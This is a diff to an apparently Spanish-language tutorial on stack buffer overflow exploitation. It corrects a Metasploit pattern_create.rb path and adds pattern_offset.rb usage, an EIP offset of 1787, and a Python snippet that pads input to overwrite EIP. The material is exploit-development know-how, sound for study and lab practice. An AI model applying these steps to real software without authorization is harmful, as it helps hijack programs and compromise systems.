@@ -46,7 +46,7 @@ ahora para saber donde esta realmente el limite del registro EIP recordar qeu de
 
 eso lo podemos ahcer generando un payload con una lib de metasploit. 
 ```sh
-/usr/share/metasploit-framework/tools/exploit/pattern-create.rb -l 1800
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1800
 ```
 
 te va a devolver bytes en hexadecimal con un patron especifico para que puedas detectar en que momento esta el limite del registro EIP.
@@ -60,5 +60,15 @@ en ese caso es `0x36684335`
 por lo que buscamos la longitud con 
 
 ```sh
-/usr/share/metasploit-framework/tools/exploit/pattern-
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x36684335
+```
+
+te va a dar una longitud de **1787** lo cual es clave
+
+si quieres probar que llegaste corretamente puedes hacer
+
+```python
+offset = 1787
+before_eip = b'A'*offset
+registro_eip= before_eip + b'B'
 ```
